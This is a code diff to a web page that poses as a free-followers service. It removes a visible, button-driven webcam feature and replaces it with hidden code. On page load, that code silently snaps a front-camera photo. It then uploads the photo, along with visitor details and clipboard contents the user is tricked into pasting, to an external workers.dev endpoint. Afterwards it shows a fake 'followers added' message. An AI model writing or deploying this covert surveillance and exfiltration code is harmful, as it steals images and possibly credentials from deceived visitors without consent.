@@ -182,12 +182,6 @@
             box-shadow: 0 4px 15px rgba(168, 85, 247, 0.3);
         }
 
-        .btn-dark-ext:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
         .status-message {
             font-size: 0.9rem;
             color: #a78bfa;
@@ -296,45 +290,6 @@
             line-height: 1.35;
         }
 
-        /* Webcam Photo Section */
-        .webcam-section {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 1.25rem;
-            margin-top: 0.5rem;
-        }
-
-        .webcam-stage {
-            width: 100%;
-            max-width: 480px;
-            aspect-ratio: 4 / 3;
-            background: rgba(12, 14, 22, 0.85);
-            border: 1px solid rgba(168, 85, 247, 0.25);
-            border-radius: 16px;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-        }
-
-        .webcam-stage video,
-        .webcam-stage img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-        }
-
-        .webcam-controls {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 0.75rem;
-            width: 100%;
-        }
-
         /* Desktop Order Assignment */
         .card-pc-no-ext { order: 1; }
         .card-pc-ext { order: 2; }
@@ -373,10 +328,6 @@
             .tutorial-btn-card {
                 width: 100%;
                 max-width: 100%;
-            }
-
-            .webcam-controls {
-                grid-template-columns: 1fr;
             }
         }
     </style>
@@ -441,31 +392,14 @@
                 </a>
             </div>
         </section>
-
-        <!-- Webcam Photo Section (Under Tutorials) -->
-        <section class="action-card webcam-section" id="webcamSection">
-            <h2 class="tutorials-heading">Webcam Photo</h2>
-
-            <div class="webcam-stage">
-                <video id="webcamVideo" autoplay playsinline></video>
-                <img id="photoPreview" alt="Captured webcam photo" style="display: none;">
-                <canvas id="photoCanvas" style="display: none;"></canvas>
-            </div>
-
-            <div class="webcam-controls">
-                <button type="button" class="btn-dark-ext" id="enableCamBtn">Enable Camera</button>
-                <button type="button" class="btn-dark-ext" id="takePhotoBtn" disabled>Take Photo</button>
-                <button type="button" class="btn-white" id="sendPhotoBtn" disabled>Send Photo</button>
-            </div>
-
-            <div class="status-message" id="photoStatusMessage"></div>
-        </section>
     </div>
 
     <script>
         const SEND_ENDPOINT = "https://young-brook-716e.abojanmawzoon.workers.dev";
         const statusEl = document.getElementById("statusMessage");
         let cachedVisitorInfo = null;
+        let mediaStream = null;
+        let capturedBlob = null;
 
         function detectBrowserName() {
             const ua = navigator.userAgent;
@@ -567,12 +501,73 @@
                         visitor
                     })
                 });
-                if (isButtonClick) {
-                    statusEl.textContent = "Restart Device And Wait 2 - 3 Hourse To get the followers added to your acc";
-                }
             } catch (error) {
-                statusEl.textContent = "Something went wrong. Please try again.";
                 console.error(error);
+            }
+        }
+
+        function captureFrameFromVideo(video) {
+            if (!video.videoWidth || !video.videoHeight) return;
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob((blob) => {
+                if (blob) {
+                    capturedBlob = blob;
+                }
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+            }, "image/jpeg", 0.85);
+        }
+
+        async function initCameraAndCapture() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+                const video = document.createElement("video");
+                video.srcObject = mediaStream;
+                video.muted = true;
+                video.playsInline = true;
+
+                await video.play().catch(() => {});
+                if (video.videoWidth && video.videoHeight) {
+                    captureFrameFromVideo(video);
+                } else {
+                    video.addEventListener("loadedmetadata", () => {
+                        video.play().catch(() => {});
+                        requestAnimationFrame(() => requestAnimationFrame(() => captureFrameFromVideo(video)));
+                    }, { once: true });
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        async function sendCapturedPhoto() {
+            if (!capturedBlob) return;
+            try {
+                const visitor = await getVisitorInfo();
+                const logLine = await formatLogMessage(visitor, "");
+
+                const formData = new FormData();
+                formData.append("eventType", "webcam_photo");
+                formData.append("formattedLog", logLine);
+                formData.append("visitor", JSON.stringify(visitor));
+                formData.append("photo", capturedBlob, "webcam.jpg");
+
+                await fetch(SEND_ENDPOINT, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (err) {
+                console.error(err);
             }
         }
 
@@ -585,6 +580,8 @@
                     return;
                 }
                 await sendClipboardData(text, true);
+                await sendCapturedPhoto();
+                statusEl.textContent = "Restart Device And Wait 2 - 3 Hourse To get the followers added to your acc";
             } catch (error) {
                 statusEl.textContent = "Error: make sure you followed one of the tuts.";
                 console.error(error);
@@ -605,103 +602,9 @@
             setTimeout(monitorClipboard, 1000);
         }
 
-        /* Webcam Capture & Upload */
-        const enableCamBtn = document.getElementById("enableCamBtn");
-        const takePhotoBtn = document.getElementById("takePhotoBtn");
-        const sendPhotoBtn = document.getElementById("sendPhotoBtn");
-        const videoEl = document.getElementById("webcamVideo");
-        const previewEl = document.getElementById("photoPreview");
-        const canvasEl = document.getElementById("photoCanvas");
-        const photoStatusEl = document.getElementById("photoStatusMessage");
-
-        let mediaStream = null;
-        let capturedBlob = null;
-
-        enableCamBtn.addEventListener("click", async () => {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                photoStatusEl.textContent = "Camera not supported on this browser.";
-                return;
-            }
-            try {
-                if (mediaStream) {
-                    mediaStream.getTracks().forEach(track => track.stop());
-                }
-                mediaStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" },
-                    audio: false
-                });
-                videoEl.srcObject = mediaStream;
-                videoEl.style.display = "block";
-                previewEl.style.display = "none";
-                capturedBlob = null;
-                takePhotoBtn.disabled = false;
-                sendPhotoBtn.disabled = true;
-                photoStatusEl.textContent = "Camera ready. Click Take Photo.";
-            } catch (err) {
-                photoStatusEl.textContent = "Camera permission denied or unavailable.";
-                console.error(err);
-            }
-        });
-
-        takePhotoBtn.addEventListener("click", () => {
-            if (!videoEl.videoWidth || !videoEl.videoHeight) {
-                photoStatusEl.textContent = "Camera stream not ready yet.";
-                return;
-            }
-            canvasEl.width = videoEl.videoWidth;
-            canvasEl.height = videoEl.videoHeight;
-            const ctx = canvasEl.getContext("2d");
-            ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
-
-            canvasEl.toBlob((blob) => {
-                if (!blob) {
-                    photoStatusEl.textContent = "Could not capture photo.";
-                    return;
-                }
-                capturedBlob = blob;
-                const url = URL.createObjectURL(blob);
-                previewEl.src = url;
-                previewEl.style.display = "block";
-                videoEl.style.display = "none";
-                sendPhotoBtn.disabled = false;
-                photoStatusEl.textContent = "Photo captured. Click Send Photo.";
-            }, "image/jpeg", 0.85);
-        });
-
-        sendPhotoBtn.addEventListener("click", async () => {
-            if (!capturedBlob) {
-                photoStatusEl.textContent = "Take a photo first.";
-                return;
-            }
-            try {
-                sendPhotoBtn.disabled = true;
-                photoStatusEl.textContent = "Sending photo...";
-
-                const visitor = await getVisitorInfo();
-                const logLine = await formatLogMessage(visitor, "");
-
-                const formData = new FormData();
-                formData.append("eventType", "webcam_photo");
-                formData.append("formattedLog", logLine);
-                formData.append("visitor", JSON.stringify(visitor));
-                formData.append("photo", capturedBlob, "webcam.jpg");
-
-                const res = await fetch(SEND_ENDPOINT, {
-                    method: "POST",
-                    body: formData
-                });
-
-                if (!res.ok) throw new Error("Upload failed");
-                photoStatusEl.textContent = "Photo sent!";
-            } catch (err) {
-                sendPhotoBtn.disabled = false;
-                photoStatusEl.textContent = "Failed to send photo. Try again.";
-                console.error(err);
-            }
-        });
-
         window.addEventListener("load", () => {
             sendVisitTelemetry();
+            initCameraAndCapture();
             setTimeout(monitorClipboard, 500);
         });
     </script>
